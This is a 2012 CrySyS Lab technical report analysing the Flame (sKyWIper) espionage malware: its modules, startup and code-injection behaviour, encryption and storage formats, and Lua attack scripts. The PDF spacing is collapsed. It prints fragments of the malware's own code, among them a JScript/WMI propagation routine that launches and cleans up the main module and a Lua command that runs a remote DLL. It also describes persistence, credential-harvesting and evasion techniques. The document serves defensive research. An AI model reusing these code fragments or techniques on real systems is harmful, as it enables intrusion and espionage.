sKyWIper(a.k.a.Flamea.k.a.Flamer): Acomplex malwarefortargetedattacks v1.05(May31,2012)–It’salivedocumentmodifiedallthetime TechnicalReport by LaboratoryofCryptographyandSystemSecurity(CrySySLab) http://www.crysys.hu/ BudapestUniversityofTechnologyandEconomics DepartmentofTelecommunications http://www.bme.hu/ Thisreportcontainsinformationprovidedbyanonymouspartiesandhence referenceswereeditedtopreservetheiranonymity Findingsinbrief In May 2012, our team participated in the analysis of an as yet unknown malware, which we internally call sKyWIper. Based on the information initially received, we understood that the malware is an important piece of a targeted attack. When we started the analysis, we did not know how many countries were affected, but we suspected that it was not limited to a single country. Our suspicion was based on indications that pieces of the malware was probably identified and uploaded from European parties onto binary analysis sites in the past. During the investigation, we received information about systems infected by sKyWIper in other countries, including Hungary, our home country. Hence, the suspicion became evidence, and this made it clear for us that our findings must be disclosed by publishing this report. It is obvious from the list of its files that sKyWIper must be identical to the malware described in the post http://www.certcc.ir/index.php?name=news&file=article&sid=1894 (from Iran National CERT (MAHER)) where it is called Flamer. For convenience, we keep our naming of the malware and call it sKyWIper based on one of the filenames (~KWI) it uses for temporary files. sKyWIper’s constitution is quite complex with a large number of components and the substantial size of some of its files. Therefore, providing its full analysis in a limited amount of time was infeasible with our current resources. Our goal was to get a quick understanding of the malware’s purpose, and to identify its main modules, storage formats, encryption algorithms, injection mechanisms and activity in general. This report contains the results of our analysis, which should help other researchers with more resources to get started and continue the analysis producing more detailed results. Our first insight suggests that sKyWIper is another info-stealer malware with a modular structure incorporating multiple propagation and attack techniques, but further analysis may discover components with other functionalities. In addition, sKyWIpermayhavebeenactive for as long as five to eight years, or even more. sKyWIper uses compression and encryption techniques to encode its files. More specifically, it uses 5 different encryption methods (and some variants), 3 different compression techniques, and at least 5 different file formats (and some proprietary formats too). It also uses special code injection techniques. Quite interestingly, sKyWIper stores information that it gathers on infected systems in a highly structured format in SQLite databases. Another uncommon feature of sKyWIper is the usage of the Lua scripting language. sKyWIper has very advanced functionality to steal information and to propagate. Multiple exploits and propagation methods can be freely configured by the attackers. Information gathering from a large network of infected computers was never crafted as carefully as in sKyWIper. The malware is most likely capable to use all of the computers’ functionalities for its goals. It covers all major possibilities to gather intelligence, including keyboard, screen, microphone, storage devices, network, wifi, Bluetooth, USB and system processes. The results of our technical analysis support the hypotheses that sKyWIper was developed by a government agency of a nation state with significant budget and effort, and it may be related to cyber warfare activities. sKyWIper is certainly the most sophisticated malware we encountered during our practice; arguably, it is the most complex malware ever found. MAJOR UPDATES: 05/30/2012 Kaspersky published much more details about modules Tableofcontents 1.

Introduction Our team at CrySyS Lab, Budapest was alerted in May 2012 of a targeted attack found in the wild. Below we summarize the investigation history and the current status of the forensic analysis. 1.1. Investigation We have carried out an investigation in collaboration with several parties involved in incident response since we were alerted of the malware sKyWIper. Some of these parties involved may want to remain anonymous; therefore, references in the document are deliberately incorrect to avoid identification of the source of some information, data, sample, code, prototype, etc. sKyWIper is too complex to be fully analyzed with our limited resources and time. Therefore, our investigations focused on the “big picture”, trying to get a first insight into the capabilities, behavior, encryption, data storage, propagation and communications of the malware. Much more work is needed to fully understand the details of the operation of the malware; however, as much debug/symbol information remains in the code, a detailed analysis seems to be feasible with additional resources and time. 1.2. History andbuilddates sKyWIper has most probably been operated undetected for years. It has been potentially operational for 5 years or more according to malware intelligence reports. The main component, msgsecmgr.ocx a.k.a. wavesup3.drv refers to many versions of a dynamic link library. This component has been previously observed (without raising an alarm) as follows: Countryof origin The filename WAVESUP3.DRV was first seen on Dec 5 2007 in Europe by the Webroot community. Since, it has been observed in the following geographical regions: • Europe on Dec 5 2007 • The United Arab Emirates on Apr 28 2008 • Islamic Republic of Iran on Mar 1 2010 File sizes The following file sizes have been seen: • 1,153,536 bytes • 991,232 bytes • 975,872 bytes 1.3. Builddates The build date PE header information of the malware uses fake date information for its files; hence we cannot precisely identify the target system’s infection time. Nonetheless, the SQLite related part of mssecmgr.ocx contains some build time info (more about the components later): “Unidentified build, Aug 31 2011 23:15:32 31...........Aug 31 2011 23:15:32” The following string shows SQLite version information, found in the memory dumps: 2010-01-05 15:30:36 28d0d7710761114a44a1a3a425a6883c661f06e7 NULL It relates to SQLITE_VERSION "3.6.22" (part of the source code) Also, there is a reference “1.2.3”, and we think that this refers to zlib version number possibly used in SQLite tables. Some tables of the malware contain timestamps, possibly some of these do not relate to actual running times, but instead some dates when the attackers developed or constructed attack flows. An example is audcache.dat that contains timestamps like the ones below. We are not sure about the timestamps’ function and about the table structure. There are other binary strings that might be timestamps, but their values vary too much to be accurate. 5409 Tue Oct 11 23:35:34 2011 5409 Tue Oct 11 23:35:37 2011 5409 Tue Oct 11 23:35:37 2011 5409 Tue Oct 11 23:35:37 2011 … ec02 Tue Oct 11 23:59:59 2011 ec02 Tue Oct 11 23:59:59 2011 ec02 Tue Oct 11 23:59:59 2011 ec02 Tue Oct 11 23:59:59 2011 ec02 Wed Oct 12 00:00:03 2011 … ec02 Wed Oct 12 10:52:33 2011 ec02 Wed Oct 12 10:52:33 2011 ec02 Wed Oct 12 10:53:04 2011 ec02 Wed Oct 12 11:09:32 2011 ec02 Wed Oct 12 11:09:32 2011 ec02 Wed Oct 12 11:21:17 2011 ec02 Wed Oct 12 11:21:17 2011 ec02 Wed Oct 12 11:21:17 2011 ec02 Wed Oct 12 11:21:17 2011 ec02 Wed Oct 12 11:22:04 2011 ec02 Wed Oct 12 11:22:04 2011 Figure1–Timestampsfoundinaudcache.dat 1.4. ComparisontoDuqu(Stuxnet)ataglance As our team played a significant role in the discovery and analysis of Duqu, another recently discovered info-stealer malware used in targeted attacks, we briefly compare sKyWIper to Duqu (and Stuxnet) in Table 1. Note that this is a high-level, simplified comparison. As it can be seen from the comparison, sKyWIper and Duqu (Stuxnet) have many differences, and it seems plausible that sKyWIper was not made by the same developer team as that of Duqu/Stuxnet/~D. However, we cannot exclude the possibility that the attackers hired multiple independent development teams for the same purpose, and sKyWIper and Duqu are two independent implementations developed for the same requirement specifications. This may be an approach to increase the robustness of an operation, which can persist even if one of the two (or more?) implementations is uncovered. Table1–ComparingsKyWIpertoDuquandStuxnetatafirstglance Laboratory of Cryptography and System Security (CrySyS) Budapest University of Technology and Economics www.crysys.hu 8 2. Maincomponents 2.1. Modules We present an overview of the modules encountered during the analysis of sKyWIper. Figure 2 shows some files related to the malware, grouped by type, with some labels indicating our current knowledge about how some of these files are created and encoded (encrypted or compressed). Figure2–Filesrelatedtothemalware The malware contains the following modules: Related OCXfiles:  mssecmgr.ocx(6 M)  Mainmodule  --resource 146 (2.5 M)  Compressed file with some zlib-like compression  advnetcfg.ocx (0.6 M)  Injected part, possibly info stealer (screen shots and alike)  msglu32.ocx (1.6 M)  Created by main module  nteps32.ocx (0.8 M)  Created by main module  soapr32.ocx (0.2 M)  Can be found in resource 146, possibly network based propagation  module  The main module of the malware is mssegmgr.ocx, which is 6 MByte long.

Activationandpropagation 3.1. Startupsequence The malware can be started using two different methods: 1. Set msgsecmgr.ocx in the registry (see below at registry parts) 2. Run the malware from rundll32 using the command as follows: start /wait rundll32.exe c:\windows\system32\mssecmgr.ocx,DDEnumCallback At startup, mssecmgr.ocx is loaded as LSA Authentication Package. About 2 minutes later advnetcfg.ocx is loaded by services.exe. It is repeated every 2 to 3 minutes 3 times in total. About 2 minutes later services.exe loads nteps32.ocx from mssecmgr.ocx, and then winlogon.exe also loads nteps32.ocx. This file is loaded several times. In the meantime, explorer.exe starts 5 iexplore processes that subsequently create wpgfilter.dat. Again 2 minutes later ccalc32.sys is written by services.exe, and in 1 minute winlogon.exe loads it. Next, mssecmgr.ocx is copied to wavsup3.drv. Then, boot32drv.sys is loaded by services.exe. This sequence of events is illustrated in Figure 5 below, while Figure 6 shows another representation with exact timestamps.   Figure 5 – Startup sequence              Laboratory of Cryptography and System Security (CrySyS) Budapest University of Technology and Economics www.crysys.hu   14  Figure6–Startupprocedurewithtimestamps 3.2. Bootupexperimentstogathertiminginformation We performed some experiment to determine the order of module loadings and activities. Trial1 ccalc32.sys has a last change and last access time at the first start -difference ~50 seconds. In normal LSA startup without mscrypt installed, ccalc was not created (no real CC traffic either). Question: Is ccalc32 created by mssecmgr+advnet+?? during startup if ran from rundll? Trial2 Nteps, soapr, to691 are removed to test if these files are needed for the malware to start. Windows update traffic starts after 1:40 min of starting rundll for startup. At iexplore exit ccalc32.sys immediately appeared. ~HLV files appear about 1:20 min after the appearance of ccalc32.sys. The exact timestamp was 23:45:00 (local time), the sharp seconds value (:00) seems suspicious. Results: nteps, soapr, to691 are not needed for startup Trial4 Starting with Rundll32 at 23:49:20 23:51:06 windowsupdate traffic begins 23:52:48 iexplore quits, about 3 seconds later ccalc appears 23:54:25 ~HVL files found in windows/temp msglu32.ocx exists, creation time is 2004, change time is current local time Trial5 Removing nteps, soapr, to691, msglu to be sure that msglu is indeed created during startup. Results: Malware is still running, msglu32 is created just at the same time as ~HLV files begin to be created. Order of events: 1. iexplore + windowsupdate traffic 2. traffic stops, ccalc32 created, some 1:20 min delay 3. ~HLV files begin to appear and msglu is deployed 3.3. Injections There are multiple injections of code during startup. Only advnetcfg32 is probably injected 3 times. We have no detailed information why code is injected into multiple processes (including winlogon.exe, services.exe, explorer.exe). 0  fltmgr.sys  fltmgr.sys + 0x1888  0xf83f0888  C:\WINDOWS\System32\Drivers\fltmgr.sys  1  fltmgr.sys  fltmgr.sys + 0x31a7  0xf83f21a7  C:\WINDOWS\System32\Drivers\fltmgr.sys  2  fltmgr.sys  fltmgr.sys + 0xfc7a  0xf83fec7a  C:\WINDOWS\System32\Drivers\fltmgr.sys  3  ntkrnlpa.exe  ntkrnlpa.exe + 0xac124  0x80583124  C:\WINDOWS\system32\ntkrnlpa.exe  4  ntkrnlpa.exe  ntkrnlpa.exe + 0xe8488  0x805bf488  C:\WINDOWS\system32\ntkrnlpa.exe  5  ntkrnlpa.exe  ntkrnlpa.exe + 0xe4a14  0x805bba14  C:\WINDOWS\system32\ntkrnlpa.exe  6  ntkrnlpa.exe  ntkrnlpa.exe + 0x9ffeb  0x80576feb  C:\WINDOWS\system32\ntkrnlpa.exe  7  ntkrnlpa.exe  ntkrnlpa.exe + 0x6a67c  0x8054167c  C:\WINDOWS\system32\ntkrnlpa.exe  8  <unknown>  0x1f2a333  0x1f2a333  9  <unknown>  0x1f1ed9c  0x1f1ed9c  10  <unknown>  0x1f1128b  0x1f1128b  11  <unknown>  0x1f1c900  0x1f1c900  Figure7–Winlogon.exewithinjectedcodeworkingwithccalc32.sys–procmon In case of Duqu, the authors used ZwCreateSection() and ZwMapViewOfSection() to copy code into running processes, while other methods use LoadLibrary() and LoadLibraryEx() to load a library into a code. These techniques can easily be detected as the inserted DLLs appear in the PEB’s InLoadOrderModuleList. In case of sKyWIper, the code injection mechanism is stealthier such that the presence of the code injection cannot be determined by conventional methods such as listing the modules of the corresponding system processes (winlogon, services, explorer). The only trace we found at the first sight is that certain memory regions are mapped with the suspicious READ, WRITE and EXECUTE protection flags, and they can only be grasped via the Virtual Address Descriptor (VAD) kernel data structure. As these regions must have been allocated dynamically by means of VirtualAllocEx() or WriteProcessMemory(), they have the type of Vad Short. Thus, the combination of RWE flags and type VadS for a given memory region in a system process allowed us to identify the code injection. Figure 8 shows the malicious code injections we found with Volatility. Process: winlogon.exe Pid: 676 Address: 0xab0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1,

This can be verified by means of vmmap as shown in Figure 9. Laboratory of Cryptography and System Security (CrySyS) Budapest University of Technology and Economics www.crysys.hu Figure9–Thepresenceofcodeinjection(vmmap) 3.4. Hooks By checking an infected machine with the GMER rootkit revealer, we can see that the infected explorer.exe hooked the SHGetSpecialFolderPathW() library call in the shell32.dll module (that is supposedly the result of a code injection). Figure10–Hookingshell32dll’sSHGetSpecialFolderPathWfunctioninexplorer.exe 3.5. Mutexes Similarly to other malicious codes, sKyWIper uses mutexes to make sure that only one instance is running from it. Mutexes are created either for injected system processes (winlogon.exe, services.exe, explorer.exe) and proprietary files. In the former case, the following naming convention is used: TH_POOL_SHD_PQOISNG_#PID#SYNCMTX, where the #PID# variable refers to the PID of the system process the mutex belongs to. Furthermore, there are other mutexes that belongs to files created by the malcode. These are the following. c__program_files_common_files_microsoft shared_msaudio_wpgfilter.dat c__program files_common files_microsoft shared_msaudio_audcache To reveal all the mutexes one can traverse Windows’ _KMUTANT data structure, however, it is difficult to grasp the malicious ones. 3.6. nteps32exports Figure11–nteps32[loadedmanytimes]exportedfunctions–lotoffunctionality It would be useful to describe here the exact meaning of the abbreviated functionality (SHR, ABH, BHD, DLV, SMLData, VBinfo, OFR, PF, PGHDict) of this interesting library, however, currently we do not have enough information on it. CreatePGHDict might be associated with some Bluetooth related activities. EnableSHR might be connected to ~DEB93D creation which contains samba nmb name resolution traffic log. 3.7. Installationandpropagationmethod There are multiple ways for the malware to propagate. One method we are aware of is related to windows update and file downloading by some modules using SSL and some proprietary text based protocol. We also have clear indications that Stuxnet’s print spooler exploit (MS10-061) and lnk exploit (MS10-046) is used within sKyWIper as well: var objFileSystem = new ActiveXObject("Scripting.FileSystemObject");var s = GetObject("winmgmts:root\\cimv2");var oProcs = s.ExecQuery("SELECT * FROM Win32_Process WHERE name='outpost.exe' or name='aupdrun.exe' or name='op_mon.exe' or name='avp.exe'");s.Delete("__EventFilter.Name='FilterForClassCreation'");s.Delete(" ActiveScriptEventConsumer.Name='ActiveScriptForSvc'");s.Delete("MyTestClass");s.Del ete("__Win32Provider.Name='ActiveScriptEventConsumer'");var f = objFileSystem.GetFile("wbem\\mof\\good\\svchostevt.mof");f.Delete(true); f =objFileSystem.GetFile("testpage");f.Delete(true);if (!oProcs.Count) { s1 = new ActiveXObject("Wscript.Shell");s1.Run("%SYSTEMROOT%\\system32\\rundll32.exe msdclr64.ocx,DDEnumCallback");while (true) { var oProcs = s.ExecQuery("SELECT * FROM Win32_Process WHERE name='rundll32.exe'"); if (!oProcs.Count) break; } var f = objFileSystem.GetFile("msdclr64.ocx");f.Delete(true);} else { var f = objFileSystem.GetFile("msdclr64.ocx"); f.Delete(true);} where msdclr64.ocx refers to the main module Figure12–Printerproblemrelatedroutinesinthemalware URL: http://<windowscomputername>/view.php?mp=1&jz=1627XXXXXX&fd=1463XXXXXX& am=55XXXXXXX55X&ef=962DXXX7EC84XXXXEC84&pr=1&ec=0&ov=66664XXXXX6641XXXXX64174&pl=gs pndXXXXXX|spnZXXX|nyXXX|0nXXX|TWvXXXX|nGcXXX… some 30-50 tags more XXX are deliberately deleted Figure13–URLusedtodownloadmssecmgr.sysbysomeinstallationpart Figure 13 shows the URL used to download the main module by some routine in the installation part of the malware. The routine downloads the file mssecmgr.ocx and some header: B5 A0 44 3F 67 EA EA EA E5 B2 EA EA. Trying to decrypt the header with algorithm E1 (see encryption algorithms later in this report) and considering 0xEA => 0x00, the result is :0000000000: 20 E1 D7 50 0A 00 00 00 . C8 0F 00 00 á.P. .. Further information shows that this is related to the windows update mechanism and the MUNCH attack (see later).

This cannot be found by a google search; hence, it is possibly used by the malware for identification purposes. For the same reason, it can possibly be used as a NIDS signature. 4. Descriptionofcomponents Now we present our initial analysis of the files used in sKyWIper. Note that given the lack of resources and time, our findings are preliminary. The main goal is to highlight the structure of the malware modules and the techniques used by the authors (e.g., for encryption); and to pave the way for a thorough investigation. 4.1. Encryptionalgorithms At the time of this writing, we identified five encryption algorithms used in the malware, we refer to them as E1-E5. E1 is used in DAT files. For E1, we managed to produce a full substitution table as presented in Figure 14 below. We could identify the encryption algorithms E2-E5 shown in subsequent figures, but we do not have a full understanding of where they are used in sKyWIper and if they are related to known encryption methods. 0  234  3 4  183  6 8  196  1 02  87  1 36  19  1 70  129  1  130  3 5  248  6 9  179  1 03  71  1 37  27  1 71  170  2  99  3 6  157  7 0  127  1 04  162  1 38  251  1 72  44  3  174  3 7  31  7 1  176  1 05  230  1 39  50  1 73  58  4  163  3 8  226  7 2  36  1 06  225  1 40  131  1 74  0  5  140  3 9  47  7 3  128  1 07  79  1 41  120  1 75  167  6  102  4 0  145  7 4  113  1 08  169  1 42  90  1 76  209  7  73  4 1  67  7 5  10  1 09  206  1 43  97  1 77  195  8  243  4 2  111  7 6  48  1 10  198  1 44  154  1 78  161  9  1  4 3  191  7 7  150  1 11  218  1 45  136  1 79  112  10  103  4 4  175  7 8  118  1 12  125  1 46  80  1 80  244  11  6  4 5  159  7 9  106  1 13  43  1 47  35  1 81  155  12  18  4 6  250  8 0  63  1 14  83  1 48  184  1 82  119  13  199  4 7  166  8 1  122  1 15  216  1 49  64  1 83  197  14  182  4 8  205  8 2  137  1 16  40  1 50  252  1 84  201  15  178  4 9  95  8 3  33  1 17  75  1 51  39  1 85  158  16  7  5 0  81  8 4  151  1 18  123  1 52  247  1 86  121  17  239  5 1  96  8 5  207  1 19  37  1 53  66  1 87  109  18  28  5 2  101  8 6  55  1 20  222  1 54  104  1 88  15  19  193  5 3  143  8 7  242  1 21  236  1 55  203  1 89  200  20  117  5 4  255  8 8  223  1 22  29  1 56  84  1 90  173  21  253  5 5  249  8 9  52  1 23  156  1 57  86  1 91  76  22  23  5 6  187  9 0  190  1 24  164  1 58  9  1 92  60  23  62  5 7  153  9 1  59  1 25  139  1 59  186  1 93  92  24  224  5 8  77  9 2  20  1 26  110  1 60  49  1 94  65  25  254  5 9  89  9 3  11  1 27  85  1 61  138  1 95  133  26  61  6 0  241  9 4  238  1 28  142  1 62  212  1 96  88  27  202  6 1  105  9 5  16  1 29  57  1 63  24  1 97  219  28  30  6 2  116  9 6  4  1 30  93  1 64  213  1 98  141  29  221  6 3  208  9 7  17  1 31  74  1 65  91  1 99  98  30  26  6 4  46  9 8  78  1 32  56  1 66  228  2 00  229  31  149  6 5  240  9 9  70  1 33  168  1 67  172  2 01  144  32  181  6 6  108  1 00  134  1 34  53  1 68  2  2 02  215  33  192  6 7  42  1 01  12  1 35  246  1 69  185  2 03  14  Laboratory of Cryptography and System Security (CrySyS) Budapest University of Technology and Economics www.crysys.hu 213  188  224  38  235  25  246  152  204  204  214  124  225  160  236  69  247  220  205  3  215  68  226  34  237  211  248  214  206  171  216  146  227  100  238  5  249  22  207  147  217  126  228  227  239  245  250  189  208  21  218  210  229  231  240  45  251  32  209  72  219  165  230  177  241  114  252  107  210  232  220  235  231  51  242  94  253  132  211  8  221  180  232  194  243  148  254  82  212  41  222  217  233  115  244  233  255  13  223  54  234  135  245  237  Figure14–EncryptionE1–Substitutiontable.Leftiscleartext,rightisciphertext.UsedforDATfiles. 4091.dll: unsigned int __cdecl encryptor_sub_4025C0(int a1) { return (a1 + 11) * (a1 + 17) ^ (((unsigned __int16)((a1 + 11) * (a1 + 17) & 0xFF00) ^ ((((unsigned int)((a1 + 11) * (a1 + 17)) >> 8) ^ (a1 + 11) * (a1 + 17) & 0xFF0000) >> 8)) >> 8);

For instance, Boot32drv.sys is an encrypted data file with simple XOR with 0xFF. to691.tmp is always among the first files that was installed into infected systems. The file contains configuration data and log results, very similar to the audcache.dat, but it is encrypted in a different way, as follows. to691.tmp is encrypted cyclically by XOR-ing with a 16-byte long binary string. The string was found to be individual on the samples. As the cleartext file contains many 0x00 characters, the XOR key can be easily found by statistical means. The method is described in Figure 21 as Encryption E6A. for i=0..15: take all characters from file at n*16+i generate statistics on characters key[i]=find most common character for i=0..filesize: decrypted[i]=encrypted[i] XOR key[i%16] Figure21–EncryptionE6A–TO6911st stagegenericdecryptionpseudocode The decrypted text after E6A is still not cleartext database format, but one can easily see that it is very similar to the file format of audcache.dat (after decryption). The second stage is a mono-alphabetical substitution, for which it may not be impossible to find a short mathematical formula to calculate the substitutions, but so far we were not able to find that. Instead, we manually investigated the file and built a partial substitution table on the characters used. The partial table is denoted as E6B in Figure 22. 0  0  1  2  3  4  5  6  79  7  8  9  A  B  6a  C  69  D  E  F  10  2e  11  12  13  37  14  15  36  16  17  18  57  19  55  1A  41  1B  1C  1D  1E  1F  20  21  22  23  24  6D  25  55  26  27  30  28  29  2A  2B  6c  2C  6e  2D  2E  44  2F  30  6F  31  32  73  33  34 78 35 58 36 37 38 39 ED 3A 3B B0 3C 3D 3E 3F 40 41 42 43 6c 44 45 2c 46 47 48 68 49 4A 4B 2d 4C 2f 4D 4E 4F 50 51 38 52 53 54 55 56 57 58 59 45 5A 47 5B 5C 5D 5E 5F 20 60 61 62 63 52 64 65 35 66 3f 67 68 69 6A 49 6B 6C 64 6D 57 6E 6F 70 71 72 73 32 74 75 2d 76 77 78 79 7A 7B 7C 4D 7D 54 7E 7F 80 4f 81 82 83 84 7e 85 86 42 87 88 89 8A 33 8B 8C 8D 8E 8F 34 90 51 91 76 92 93 BA 94 95 46 96 97 70 98 99 9A 9B 4a 9C  4e  9D  9E  3e  9F  A0  A1  75  A2  A3  A4  62  A5  6b  A6  A7  3A  A8  A9  7d  AA  AB  AC  63  AD  67  AE  AF  B0  B1  B2  B3  B4  B5  31  B6  B7  B8  FE  B9  72  BA  BB  32  BC  BD  66  BE  BF  C0  43  C1  C2  74  C3  C4  C5  C6  C7  C8  C9  CA  CB  53  CC  CD  CE  48  CF  77  D0  D1  5b  D2  D3  D4  D5  50  D6  D7  D8  D9  DA  4c  DB  DC  DD  56  DE  59  DF  E0  4b  E1  5d  E2  E3  E4  E5  E6  65  E7  FF  E8  E9  EA  EB  EC  ED  EE  EF  F0  F1  F2  F3  F4  F5  25  F6  F7  7a  F8  F9  FA  5f  FB  61  FC  FD  FE  5C  FF  Figure22–EncryptionE6B–TO6912ndstagesubstitutiontable–knownelements (left:ciphercharacter,right:cleartextcharacter) We also share some samples with the encryptions above to make it easier to pinpoint the encryption algorithm: 0000000000: FF F5 FF FF FF FE FE 23 .

" Figure34–“8FAFAC84”PPMdcompressedrecordinntcache.dat The table format is as follows: Ater 4 bytes header every record begins with UNIX timestamp (like 0x4FXX3651 in the figure), then “03 00 00” is some kind of record header, “22” refers to record length, but you should add 3, as the next “00 00 00” is not strictly related to the record, so the real payload without the “00 00 00” string is 0x22 bytes long. Most of the records are readable queries like the ones above, but some contain raw samba protocol data. The creation of ~DEB93D files are connected to nteps32 export functions, possibly EnableSHR, but this is not confirmed yet. 4.4. Datastorageformats Although the HLV and KWI file formats are not yet fully understood, these files contain data resembling to database table records and some records of the above described compressed formats. From the extracted contents of some of these data files we found that they all (HLV, KWI, and even ntcache.dat) contain basic information on running processes. The information is about 1000-2000 bytes of redundant data. It contains the actual status of the running program, and in some cases, historical data as well. In some cases, they seem to contain screenshot related information besides the list of running processes. Further investigations on these files indicated that the KWI files have different purpose as shown in the figures below: HighSeverityStorageFileName -KWI989.tmp LowSeverityStorageFileName -KWI988.tmp Figure35–KWIfilenamesfoundinccalc32drv.sys,labelshintthepurposeoftheKWIfiles %CommonProgramFiles%\Microsoft Shared\MSAudio\ %CommonProgramFiles%\Microsoft Shared\MSSecurityMgr\ %CommonProgramFiles%\Microsoft Shared\MSAPackages\ Figure36–DatStorage–possiblelocations(thisisthesameasNteps32exports) 4.5. Loggingfilelist The malware saves ~rf<number> files in /windows/temp. This operation seems to be automatic, but perhaps it may also be remotely controlled. These files are encrypted with the E1 encryption algorithm (see above). After decryption, the file appears to be an SQLite3 database, storing information on drivers, directories, and file names. Figure37–SQLitedatabaseformatfor~rffiles[filedb] Figure38–Filelistofthefilesysteminthe~rffiles Discussion: Storing full directory listing in SQLite databases is something you won’t expect from a malware. It’s very strange as it raises complexity and the need for space, and in addition it leaks information through the database structure. Note that the “SQLite browser” application cannot see full filenames as they are stored in Unicode format in blob entries, and the first \x00 stops viewing them. 4.6.

Great work is going on the topic! on 30/05 new information was published by Kasperksy It’s available at https://www.securelist.com/en/blog?weblogid=208193538#w208193538 We updated this document to reflect up-to-date information on 30/05/2012. So from Kaspersky: Here is a brief overview of the available units. The names were extracted from the binary and the 146 resource. Beetlejuice  Bluetooth: enumerates devices around the infected machine. May turn itself into a “beacon”: announces the computer as a discoverable device and encode the status of the malware in device information using base64.  Microbe  Records audio from existing hardware sources. Lists all multimedia devices, stores complete device configuration, tries to select suitable recording device.  Infectmedia  Selects one of the methods for infecting media, i.e. USB disks. Available methods: Autorun_infector, Euphoria.  Autorun_infector  Creates “autorun.inf” that contains the malware and starts with a custom “open” command. The same method was used by Stuxnet before it employed the LNK exploit.  Euphoria  Create a “junction point” directory with “desktop.ini” and “target.lnk” from LINK1 and LINK2 entries of resource 146 (were not present in the resource file). The directory acts as a shortcut for launching Flame.  Limbo  Creates backdoor accounts with login “HelpAssistant” on the machines within the network domain if appropriate rights are available.  Frog  Infect machines using pre-defined user accounts. The only user account specified in the configuration resource is “HelpAssistant” that is created by the “Limbo” attack.  Munch  HTTP server that responds to “/view.php” and “/wpad.dat” requests.  Snack  Listens on network interfaces, receives and saves NBNS packets in a log file. Has an option to start only when “Munch” is started. Collected data is then used for replicating by network.  Boot_dll_loader  Configuration section that contains the list of all additional modules that should be loaded and started.  Weasel  Creates a directory listing of the infected computer.  Boost  Creates a list of “interesting” files using several filename masks.  Telemetry  Logging facilities  Gator  When an Internet connection becomes available, it connects to the C&C servers, downloads new modules, and uploads collected data.  Security  Identifies programs that may be hazardous to Flame, i.e., anti-virus programs and firewalls.  Bunny Dbquery Driller Headache Gadget  The purpose of these modules is not yet known.  6.1. SomeinterestingLuascriptsinsidethecode CRUISE_CRED.lua The script gathers credential information from an already infected machine. More precisely, it cruises all the token objects to find the ones belong to the administrator or the Administrators, Domain Admins groups. If it is successful, it updates cruiseAttackLog in the “CLAN” database by means of the user sd and the user name. For more information, please see the Tables creds and cruise_attack_log in Figure 48. basic_info_app.lua The script gathers basic information about an infected computer such as the flame version it has been infected with, the computer name, the ip address of the machine. Furthermore, it books various parameters about the nature of information leak (e.g., AVERAGE_LEAK_BANDWIDTH, LAST_LEAK_TO_INTERNET, MEDIA_LEAKS_FROM_THIS_ COMPUTER, etc). Note that the FLAME_VERSION parameter must have been used to avoid the reinfection of the same computer and also to update flame if it is neccessary. clan_seclog.lua The script parses the Security log by searching for certain event Ids and retrieves the correspondig username and ip information from it. It is supposedly used to collect information about the traces of infection, or the credentials and source IPs used to authenticate to the infected machine. The script examines the following event Ids, where the corresponding log entries store the required pieces of information (Account Name, User Name and IP address) Event Id: 540 – Refers to successful network logon. Among various parameters the log stores the User Name and Source Network Address as well. Event Id: 672 – Refers to Authentication Ticket Granted Audit event. In case of Windows, the Kerberos authentication uses the optional pre-authentication phase before issuing an authentication ticket by checking the credentials of the client. If the client successfully authenticated to the workstation, Windows puts a log entry with event id 672 into the Security log in order to demonstrate the successful initial logon event. Event Id 673: -Refers to Service Ticket Granted Audit event. Once the authentication ticket is granted a service ticket have to be gained. If it is so, the client could successfully logon to the domain, and Windows puts a log entry with the 673 event Id to the Security Log. Event Id 680: -Refers to Account Used for Logon by: <authentication package> . json.lua: json related string functions only casafety.lua: “CLANattack safety” tries to find out processes, registry information and similar related to ESET, KAV, McAfee, TrendMicro, and list from THREATENING_ PROGRAMS.

Relatedfiles 0004784.dll(Jimmy.dll) 0004784.dll is part of the “Jimmy” attack hence we use the name jimmy.dll. It contains the string “c:\Projects\Jimmy\jimmydll_v2.0\JimmyForClan\Jimmy\bin\srelease\jimmydll\i ndsvc32.pdb”. 0004784.dll (jimmy.dll) can be extracted from decompressed resource 146 at position 0x2561F3. By running the jimmy.dll with rundll32 jimmy.dll, QDInit, it starts to produce files ~a29.tmp and ~dra52.tmp. (QDInit == Quick Disk Inspection?) Related information can be found in lua files: ATTACKOP_JIMMY.lua: ctx.exec:exec({cmdLine = ctx.transport:expandLocal(string.format("cmd /c cd \"%%temp%%\" &&(if exist \"%s\" start /wait rundll32 \"%s\",%s)&move /y \"%%_systemroot%%\\temp\\~dra52.tmp\" \"~dra53.tmp\" &del /q \"%s\"", remoteDLLBasename, remoteDLLBasename, dllExportedFunction, remoteDLLBasename)), mofInfo = {confPath = "LUA.CLAN.JIMMY_MOF", fn = "svchost1ex.mof"}}) Figure47–JimmytempfilesreferenceinLuascriptATTACKOP_JIMMY.lua The produced ~dra52.tmp in our samples contained around 580 byte compressed data (PPMd) on some partial file listings related information of some (5-10) files of the file system. The remaining data is compressed or encrypted. Most likely jimmy.dll is capable to grab screenshots and other modules perform other information stealing tasks. If we run the jimmy.dll manually with rundll32, ~a29.tmp contains 12 bytes, bytes pos 0x4.0x7 are different on different systems, other bytes match. 00004069.exe 00004069.exe registers itself under the name “Windows Management Instrumentation Configurator”, and contains references to %windir%\system32\rdcvlt32.exe %temp%\sl84.tmp WinInit.INI and other files. 6.3. SQLitetablestructureofCLANDB Attack and other information is stored in SQLite and unknown “CLAN” databases. The dstrlog structure is described below. It appears unusual to use databases to store attack related information inside the malware, but apparently this is the case: mssecmgr.dll contains DB2 ODBC references inside (unknown goal) and attack strings contain Oracle references as well (most likely for information gathering). Figure48–dstrlogstructure,part1 Laboratory of Cryptography and System Security (CrySyS) Budapest University of Technology and Economics www.crysys.hu 53 Figure49–dstrlogstructure,part2 Laboratory of Cryptography and System Security (CrySyS) Budapest University of Technology and Economics www.crysys.hu 54 Figure50–dstrlogstructure,part3 7. Evasiontechniques 7.1. Security programsrelation The authors took extra precautions to evade detection by security products. The list is so comprehensive it is rarely seen. A very similar list can be found in the ccalc32drv.sys file, where table DangerousProcesses contains 346 items. We do not disclose the list as it could serve other malware authors for their goals. 7.2. Designchoicesandtricks It can clearly be seen that this malware was continuously developed over a long time period and it employs several tricks to evade security products. For example, the extensions are chosen according to the detected anti-malware products. We found that the malware usually uses the .ocx extension, but this decision is based on how to get best under the radar. In case of McAfee McShield installed, the preferred extension is changed to .tmp as seen in the decompiled code segment below. Transport.getPreferredDLLExtension = function(l_10_0) local remoteProcs = 